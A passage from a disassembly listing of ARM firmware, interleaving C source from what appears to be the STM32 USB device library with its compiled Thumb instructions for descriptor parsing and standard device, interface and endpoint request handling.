 800b732:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b734:	e013      	b.n	800b75e <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b736:	f107 030a 	add.w	r3, r7, #10
 800b73a:	4619      	mov	r1, r3
 800b73c:	6978      	ldr	r0, [r7, #20]
 800b73e:	f000 f81b 	bl	800b778 <USBD_GetNextDesc>
 800b742:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b744:	697b      	ldr	r3, [r7, #20]
 800b746:	785b      	ldrb	r3, [r3, #1]
 800b748:	2b05      	cmp	r3, #5
 800b74a:	d108      	bne.n	800b75e <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b74c:	697b      	ldr	r3, [r7, #20]
 800b74e:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b750:	693b      	ldr	r3, [r7, #16]
 800b752:	789b      	ldrb	r3, [r3, #2]
 800b754:	78fa      	ldrb	r2, [r7, #3]
 800b756:	429a      	cmp	r2, r3
 800b758:	d008      	beq.n	800b76c <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b75a:	2300      	movs	r3, #0
 800b75c:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b75e:	68fb      	ldr	r3, [r7, #12]
 800b760:	885b      	ldrh	r3, [r3, #2]
 800b762:	b29a      	uxth	r2, r3
 800b764:	897b      	ldrh	r3, [r7, #10]
 800b766:	429a      	cmp	r2, r3
 800b768:	d8e5      	bhi.n	800b736 <USBD_GetEpDesc+0x32>
 800b76a:	e000      	b.n	800b76e <USBD_GetEpDesc+0x6a>
          break;
 800b76c:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b76e:	693b      	ldr	r3, [r7, #16]
}
 800b770:	4618      	mov	r0, r3
 800b772:	3718      	adds	r7, #24
 800b774:	46bd      	mov	sp, r7
 800b776:	bd80      	pop	{r7, pc}

0800b778 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b778:	b480      	push	{r7}
 800b77a:	b085      	sub	sp, #20
 800b77c:	af00      	add	r7, sp, #0
 800b77e:	6078      	str	r0, [r7, #4]
 800b780:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b782:	687b      	ldr	r3, [r7, #4]
 800b784:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b786:	683b      	ldr	r3, [r7, #0]
 800b788:	881a      	ldrh	r2, [r3, #0]
 800b78a:	68fb      	ldr	r3, [r7, #12]
 800b78c:	781b      	ldrb	r3, [r3, #0]
 800b78e:	b29b      	uxth	r3, r3
 800b790:	4413      	add	r3, r2
 800b792:	b29a      	uxth	r2, r3
 800b794:	683b      	ldr	r3, [r7, #0]
 800b796:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b798:	68fb      	ldr	r3, [r7, #12]
 800b79a:	781b      	ldrb	r3, [r3, #0]
 800b79c:	461a      	mov	r2, r3
 800b79e:	687b      	ldr	r3, [r7, #4]
 800b7a0:	4413      	add	r3, r2
 800b7a2:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b7a4:	68fb      	ldr	r3, [r7, #12]
}
 800b7a6:	4618      	mov	r0, r3
 800b7a8:	3714      	adds	r7, #20
 800b7aa:	46bd      	mov	sp, r7
 800b7ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b7b0:	4770      	bx	lr

0800b7b2 <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b7b2:	b480      	push	{r7}
 800b7b4:	b087      	sub	sp, #28
 800b7b6:	af00      	add	r7, sp, #0
 800b7b8:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b7ba:	687b      	ldr	r3, [r7, #4]
 800b7bc:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b7be:	697b      	ldr	r3, [r7, #20]
 800b7c0:	781b      	ldrb	r3, [r3, #0]
 800b7c2:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b7c4:	697b      	ldr	r3, [r7, #20]
 800b7c6:	3301      	adds	r3, #1
 800b7c8:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b7ca:	697b      	ldr	r3, [r7, #20]
 800b7cc:	781b      	ldrb	r3, [r3, #0]
 800b7ce:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b7d0:	8a3b      	ldrh	r3, [r7, #16]
 800b7d2:	021b      	lsls	r3, r3, #8
 800b7d4:	b21a      	sxth	r2, r3
 800b7d6:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b7da:	4313      	orrs	r3, r2
 800b7dc:	b21b      	sxth	r3, r3
 800b7de:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b7e0:	89fb      	ldrh	r3, [r7, #14]
}
 800b7e2:	4618      	mov	r0, r3
 800b7e4:	371c      	adds	r7, #28
 800b7e6:	46bd      	mov	sp, r7
 800b7e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b7ec:	4770      	bx	lr
	...

0800b7f0 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b7f0:	b580      	push	{r7, lr}
 800b7f2:	b084      	sub	sp, #16
 800b7f4:	af00      	add	r7, sp, #0
 800b7f6:	6078      	str	r0, [r7, #4]
 800b7f8:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b7fa:	2300      	movs	r3, #0
 800b7fc:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b7fe:	683b      	ldr	r3, [r7, #0]
 800b800:	781b      	ldrb	r3, [r3, #0]
 800b802:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b806:	2b40      	cmp	r3, #64	; 0x40
 800b808:	d005      	beq.n	800b816 <USBD_StdDevReq+0x26>
 800b80a:	2b40      	cmp	r3, #64	; 0x40
 800b80c:	d857      	bhi.n	800b8be <USBD_StdDevReq+0xce>
 800b80e:	2b00      	cmp	r3, #0
 800b810:	d00f      	beq.n	800b832 <USBD_StdDevReq+0x42>
 800b812:	2b20      	cmp	r3, #32
 800b814:	d153      	bne.n	800b8be <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b816:	687b      	ldr	r3, [r7, #4]
 800b818:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b81c:	687b      	ldr	r3, [r7, #4]
 800b81e:	32ae      	adds	r2, #174	; 0xae
 800b820:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b824:	689b      	ldr	r3, [r3, #8]
 800b826:	6839      	ldr	r1, [r7, #0]
 800b828:	6878      	ldr	r0, [r7, #4]
 800b82a:	4798      	blx	r3
 800b82c:	4603      	mov	r3, r0
 800b82e:	73fb      	strb	r3, [r7, #15]
      break;
 800b830:	e04a      	b.n	800b8c8 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b832:	683b      	ldr	r3, [r7, #0]
 800b834:	785b      	ldrb	r3, [r3, #1]
 800b836:	2b09      	cmp	r3, #9
 800b838:	d83b      	bhi.n	800b8b2 <USBD_StdDevReq+0xc2>
 800b83a:	a201      	add	r2, pc, #4	; (adr r2, 800b840 <USBD_StdDevReq+0x50>)
 800b83c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b840:	0800b895 	.word	0x0800b895
 800b844:	0800b8a9 	.word	0x0800b8a9
 800b848:	0800b8b3 	.word	0x0800b8b3
 800b84c:	0800b89f 	.word	0x0800b89f
 800b850:	0800b8b3 	.word	0x0800b8b3
 800b854:	0800b873 	.word	0x0800b873
 800b858:	0800b869 	.word	0x0800b869
 800b85c:	0800b8b3 	.word	0x0800b8b3
 800b860:	0800b88b 	.word	0x0800b88b
 800b864:	0800b87d 	.word	0x0800b87d
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b868:	6839      	ldr	r1, [r7, #0]
 800b86a:	6878      	ldr	r0, [r7, #4]
 800b86c:	f000 fa3c 	bl	800bce8 <USBD_GetDescriptor>
          break;
 800b870:	e024      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b872:	6839      	ldr	r1, [r7, #0]
 800b874:	6878      	ldr	r0, [r7, #4]
 800b876:	f000 fbcb 	bl	800c010 <USBD_SetAddress>
          break;
 800b87a:	e01f      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b87c:	6839      	ldr	r1, [r7, #0]
 800b87e:	6878      	ldr	r0, [r7, #4]
 800b880:	f000 fc0a 	bl	800c098 <USBD_SetConfig>
 800b884:	4603      	mov	r3, r0
 800b886:	73fb      	strb	r3, [r7, #15]
          break;
 800b888:	e018      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b88a:	6839      	ldr	r1, [r7, #0]
 800b88c:	6878      	ldr	r0, [r7, #4]
 800b88e:	f000 fcad 	bl	800c1ec <USBD_GetConfig>
          break;
 800b892:	e013      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b894:	6839      	ldr	r1, [r7, #0]
 800b896:	6878      	ldr	r0, [r7, #4]
 800b898:	f000 fcde 	bl	800c258 <USBD_GetStatus>
          break;
 800b89c:	e00e      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b89e:	6839      	ldr	r1, [r7, #0]
 800b8a0:	6878      	ldr	r0, [r7, #4]
 800b8a2:	f000 fd0d 	bl	800c2c0 <USBD_SetFeature>
          break;
 800b8a6:	e009      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b8a8:	6839      	ldr	r1, [r7, #0]
 800b8aa:	6878      	ldr	r0, [r7, #4]
 800b8ac:	f000 fd31 	bl	800c312 <USBD_ClrFeature>
          break;
 800b8b0:	e004      	b.n	800b8bc <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b8b2:	6839      	ldr	r1, [r7, #0]
 800b8b4:	6878      	ldr	r0, [r7, #4]
 800b8b6:	f000 fd88 	bl	800c3ca <USBD_CtlError>
          break;
 800b8ba:	bf00      	nop
      }
      break;
 800b8bc:	e004      	b.n	800b8c8 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b8be:	6839      	ldr	r1, [r7, #0]
 800b8c0:	6878      	ldr	r0, [r7, #4]
 800b8c2:	f000 fd82 	bl	800c3ca <USBD_CtlError>
      break;
 800b8c6:	bf00      	nop
  }

  return ret;
 800b8c8:	7bfb      	ldrb	r3, [r7, #15]
}
 800b8ca:	4618      	mov	r0, r3
 800b8cc:	3710      	adds	r7, #16
 800b8ce:	46bd      	mov	sp, r7
 800b8d0:	bd80      	pop	{r7, pc}
 800b8d2:	bf00      	nop

0800b8d4 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b8d4:	b580      	push	{r7, lr}
 800b8d6:	b084      	sub	sp, #16
 800b8d8:	af00      	add	r7, sp, #0
 800b8da:	6078      	str	r0, [r7, #4]
 800b8dc:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b8de:	2300      	movs	r3, #0
 800b8e0:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b8e2:	683b      	ldr	r3, [r7, #0]
 800b8e4:	781b      	ldrb	r3, [r3, #0]
 800b8e6:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b8ea:	2b40      	cmp	r3, #64	; 0x40
 800b8ec:	d005      	beq.n	800b8fa <USBD_StdItfReq+0x26>
 800b8ee:	2b40      	cmp	r3, #64	; 0x40
 800b8f0:	d852      	bhi.n	800b998 <USBD_StdItfReq+0xc4>
 800b8f2:	2b00      	cmp	r3, #0
 800b8f4:	d001      	beq.n	800b8fa <USBD_StdItfReq+0x26>
 800b8f6:	2b20      	cmp	r3, #32
 800b8f8:	d14e      	bne.n	800b998 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b8fa:	687b      	ldr	r3, [r7, #4]
 800b8fc:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b900:	b2db      	uxtb	r3, r3
 800b902:	3b01      	subs	r3, #1
 800b904:	2b02      	cmp	r3, #2
 800b906:	d840      	bhi.n	800b98a <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b908:	683b      	ldr	r3, [r7, #0]
 800b90a:	889b      	ldrh	r3, [r3, #4]
 800b90c:	b2db      	uxtb	r3, r3
 800b90e:	2b01      	cmp	r3, #1
 800b910:	d836      	bhi.n	800b980 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b912:	683b      	ldr	r3, [r7, #0]
 800b914:	889b      	ldrh	r3, [r3, #4]
 800b916:	b2db      	uxtb	r3, r3
 800b918:	4619      	mov	r1, r3
 800b91a:	6878      	ldr	r0, [r7, #4]
 800b91c:	f7ff fed8 	bl	800b6d0 <USBD_CoreFindIF>
 800b920:	4603      	mov	r3, r0
 800b922:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b924:	7bbb      	ldrb	r3, [r7, #14]
 800b926:	2bff      	cmp	r3, #255	; 0xff
 800b928:	d01d      	beq.n	800b966 <USBD_StdItfReq+0x92>
 800b92a:	7bbb      	ldrb	r3, [r7, #14]
 800b92c:	2b00      	cmp	r3, #0
 800b92e:	d11a      	bne.n	800b966 <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b930:	7bba      	ldrb	r2, [r7, #14]
 800b932:	687b      	ldr	r3, [r7, #4]
 800b934:	32ae      	adds	r2, #174	; 0xae
 800b936:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b93a:	689b      	ldr	r3, [r3, #8]
 800b93c:	2b00      	cmp	r3, #0
 800b93e:	d00f      	beq.n	800b960 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b940:	7bba      	ldrb	r2, [r7, #14]
 800b942:	687b      	ldr	r3, [r7, #4]
 800b944:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b948:	7bba      	ldrb	r2, [r7, #14]
 800b94a:	687b      	ldr	r3, [r7, #4]
 800b94c:	32ae      	adds	r2, #174	; 0xae
 800b94e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b952:	689b      	ldr	r3, [r3, #8]
 800b954:	6839      	ldr	r1, [r7, #0]
 800b956:	6878      	ldr	r0, [r7, #4]
 800b958:	4798      	blx	r3
 800b95a:	4603      	mov	r3, r0
 800b95c:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b95e:	e004      	b.n	800b96a <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b960:	2303      	movs	r3, #3
 800b962:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b964:	e001      	b.n	800b96a <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b966:	2303      	movs	r3, #3
 800b968:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b96a:	683b      	ldr	r3, [r7, #0]
 800b96c:	88db      	ldrh	r3, [r3, #6]
 800b96e:	2b00      	cmp	r3, #0
 800b970:	d110      	bne.n	800b994 <USBD_StdItfReq+0xc0>
 800b972:	7bfb      	ldrb	r3, [r7, #15]
 800b974:	2b00      	cmp	r3, #0
 800b976:	d10d      	bne.n	800b994 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b978:	6878      	ldr	r0, [r7, #4]
 800b97a:	f000 fdf1 	bl	800c560 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b97e:	e009      	b.n	800b994 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b980:	6839      	ldr	r1, [r7, #0]
 800b982:	6878      	ldr	r0, [r7, #4]
 800b984:	f000 fd21 	bl	800c3ca <USBD_CtlError>
          break;
 800b988:	e004      	b.n	800b994 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b98a:	6839      	ldr	r1, [r7, #0]
 800b98c:	6878      	ldr	r0, [r7, #4]
 800b98e:	f000 fd1c 	bl	800c3ca <USBD_CtlError>
          break;
 800b992:	e000      	b.n	800b996 <USBD_StdItfReq+0xc2>
          break;
 800b994:	bf00      	nop
      }
      break;
 800b996:	e004      	b.n	800b9a2 <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b998:	6839      	ldr	r1, [r7, #0]
 800b99a:	6878      	ldr	r0, [r7, #4]
 800b99c:	f000 fd15 	bl	800c3ca <USBD_CtlError>
      break;
 800b9a0:	bf00      	nop
  }

  return ret;
 800b9a2:	7bfb      	ldrb	r3, [r7, #15]
}
 800b9a4:	4618      	mov	r0, r3
 800b9a6:	3710      	adds	r7, #16
 800b9a8:	46bd      	mov	sp, r7
 800b9aa:	bd80      	pop	{r7, pc}

0800b9ac <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b9ac:	b580      	push	{r7, lr}
 800b9ae:	b084      	sub	sp, #16
 800b9b0:	af00      	add	r7, sp, #0
 800b9b2:	6078      	str	r0, [r7, #4]
 800b9b4:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b9b6:	2300      	movs	r3, #0
 800b9b8:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b9ba:	683b      	ldr	r3, [r7, #0]
 800b9bc:	889b      	ldrh	r3, [r3, #4]
 800b9be:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b9c0:	683b      	ldr	r3, [r7, #0]
 800b9c2:	781b      	ldrb	r3, [r3, #0]
 800b9c4:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b9c8:	2b40      	cmp	r3, #64	; 0x40
 800b9ca:	d007      	beq.n	800b9dc <USBD_StdEPReq+0x30>
 800b9cc:	2b40      	cmp	r3, #64	; 0x40
 800b9ce:	f200 817f 	bhi.w	800bcd0 <USBD_StdEPReq+0x324>
 800b9d2:	2b00      	cmp	r3, #0
 800b9d4:	d02a      	beq.n	800ba2c <USBD_StdEPReq+0x80>
 800b9d6:	2b20      	cmp	r3, #32
 800b9d8:	f040 817a 	bne.w	800bcd0 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b9dc:	7bbb      	ldrb	r3, [r7, #14]
 800b9de:	4619      	mov	r1, r3
 800b9e0:	6878      	ldr	r0, [r7, #4]
 800b9e2:	f7ff fe82 	bl	800b6ea <USBD_CoreFindEP>
 800b9e6:	4603      	mov	r3, r0
 800b9e8:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b9ea:	7b7b      	ldrb	r3, [r7, #13]
 800b9ec:	2bff      	cmp	r3, #255	; 0xff
 800b9ee:	f000 8174 	beq.w	800bcda <USBD_StdEPReq+0x32e>
 800b9f2:	7b7b      	ldrb	r3, [r7, #13]
 800b9f4:	2b00      	cmp	r3, #0
 800b9f6:	f040 8170 	bne.w	800bcda <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b9fa:	7b7a      	ldrb	r2, [r7, #13]
 800b9fc:	687b      	ldr	r3, [r7, #4]
 800b9fe:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800ba02:	7b7a      	ldrb	r2, [r7, #13]
 800ba04:	687b      	ldr	r3, [r7, #4]
 800ba06:	32ae      	adds	r2, #174	; 0xae
 800ba08:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ba0c:	689b      	ldr	r3, [r3, #8]
 800ba0e:	2b00      	cmp	r3, #0
 800ba10:	f000 8163 	beq.w	800bcda <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800ba14:	7b7a      	ldrb	r2, [r7, #13]
 800ba16:	687b      	ldr	r3, [r7, #4]
 800ba18:	32ae      	adds	r2, #174	; 0xae
 800ba1a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ba1e:	689b      	ldr	r3, [r3, #8]
 800ba20:	6839      	ldr	r1, [r7, #0]
 800ba22:	6878      	ldr	r0, [r7, #4]
 800ba24:	4798      	blx	r3
 800ba26:	4603      	mov	r3, r0
 800ba28:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800ba2a:	e156      	b.n	800bcda <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800ba2c:	683b      	ldr	r3, [r7, #0]
 800ba2e:	785b      	ldrb	r3, [r3, #1]
 800ba30:	2b03      	cmp	r3, #3
 800ba32:	d008      	beq.n	800ba46 <USBD_StdEPReq+0x9a>
 800ba34:	2b03      	cmp	r3, #3
 800ba36:	f300 8145 	bgt.w	800bcc4 <USBD_StdEPReq+0x318>
 800ba3a:	2b00      	cmp	r3, #0
 800ba3c:	f000 809b 	beq.w	800bb76 <USBD_StdEPReq+0x1ca>
 800ba40:	2b01      	cmp	r3, #1
 800ba42:	d03c      	beq.n	800babe <USBD_StdEPReq+0x112>
 800ba44:	e13e      	b.n	800bcc4 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800ba46:	687b      	ldr	r3, [r7, #4]
 800ba48:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800ba4c:	b2db      	uxtb	r3, r3
 800ba4e:	2b02      	cmp	r3, #2
 800ba50:	d002      	beq.n	800ba58 <USBD_StdEPReq+0xac>
 800ba52:	2b03      	cmp	r3, #3
 800ba54:	d016      	beq.n	800ba84 <USBD_StdEPReq+0xd8>
 800ba56:	e02c      	b.n	800bab2 <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800ba58:	7bbb      	ldrb	r3, [r7, #14]
 800ba5a:	2b00      	cmp	r3, #0
 800ba5c:	d00d      	beq.n	800ba7a <USBD_StdEPReq+0xce>
 800ba5e:	7bbb      	ldrb	r3, [r7, #14]
 800ba60:	2b80      	cmp	r3, #128	; 0x80
 800ba62:	d00a      	beq.n	800ba7a <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800ba64:	7bbb      	ldrb	r3, [r7, #14]
 800ba66:	4619      	mov	r1, r3
 800ba68:	6878      	ldr	r0, [r7, #4]
 800ba6a:	f001 fa21 	bl	800ceb0 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800ba6e:	2180      	movs	r1, #128	; 0x80
 800ba70:	6878      	ldr	r0, [r7, #4]
 800ba72:	f001 fa1d 	bl	800ceb0 <USBD_LL_StallEP>
 800ba76:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800ba78:	e020      	b.n	800babc <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800ba7a:	6839      	ldr	r1, [r7, #0]
 800ba7c:	6878      	ldr	r0, [r7, #4]
 800ba7e:	f000 fca4 	bl	800c3ca <USBD_CtlError>
              break;
 800ba82:	e01b      	b.n	800babc <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800ba84:	683b      	ldr	r3, [r7, #0]
 800ba86:	885b      	ldrh	r3, [r3, #2]
 800ba88:	2b00      	cmp	r3, #0
 800ba8a:	d10e      	bne.n	800baaa <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800ba8c:	7bbb      	ldrb	r3, [r7, #14]
 800ba8e:	2b00      	cmp	r3, #0
 800ba90:	d00b      	beq.n	800baaa <USBD_StdEPReq+0xfe>
 800ba92:	7bbb      	ldrb	r3, [r7, #14]
 800ba94:	2b80      	cmp	r3, #128	; 0x80
 800ba96:	d008      	beq.n	800baaa <USBD_StdEPReq+0xfe>
 800ba98:	683b      	ldr	r3, [r7, #0]
 800ba9a:	88db      	ldrh	r3, [r3, #6]
 800ba9c:	2b00      	cmp	r3, #0
 800ba9e:	d104      	bne.n	800baaa <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800baa0:	7bbb      	ldrb	r3, [r7, #14]
 800baa2:	4619      	mov	r1, r3
 800baa4:	6878      	ldr	r0, [r7, #4]
 800baa6:	f001 fa03 	bl	800ceb0 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800baaa:	6878      	ldr	r0, [r7, #4]
 800baac:	f000 fd58 	bl	800c560 <USBD_CtlSendStatus>

              break;
 800bab0:	e004      	b.n	800babc <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800bab2:	6839      	ldr	r1, [r7, #0]
 800bab4:	6878      	ldr	r0, [r7, #4]
 800bab6:	f000 fc88 	bl	800c3ca <USBD_CtlError>
              break;
 800baba:	bf00      	nop
          }
          break;
 800babc:	e107      	b.n	800bcce <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800babe:	687b      	ldr	r3, [r7, #4]
 800bac0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bac4:	b2db      	uxtb	r3, r3
 800bac6:	2b02      	cmp	r3, #2
 800bac8:	d002      	beq.n	800bad0 <USBD_StdEPReq+0x124>
 800baca:	2b03      	cmp	r3, #3
 800bacc:	d016      	beq.n	800bafc <USBD_StdEPReq+0x150>
 800bace:	e04b      	b.n	800bb68 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800bad0:	7bbb      	ldrb	r3, [r7, #14]
 800bad2:	2b00      	cmp	r3, #0
 800bad4:	d00d      	beq.n	800baf2 <USBD_StdEPReq+0x146>
 800bad6:	7bbb      	ldrb	r3, [r7, #14]
 800bad8:	2b80      	cmp	r3, #128	; 0x80
 800bada:	d00a      	beq.n	800baf2 <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800badc:	7bbb      	ldrb	r3, [r7, #14]
 800bade:	4619      	mov	r1, r3
 800bae0:	6878      	ldr	r0, [r7, #4]
 800bae2:	f001 f9e5 	bl	800ceb0 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800bae6:	2180      	movs	r1, #128	; 0x80
 800bae8:	6878      	ldr	r0, [r7, #4]
 800baea:	f001 f9e1 	bl	800ceb0 <USBD_LL_StallEP>
 800baee:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
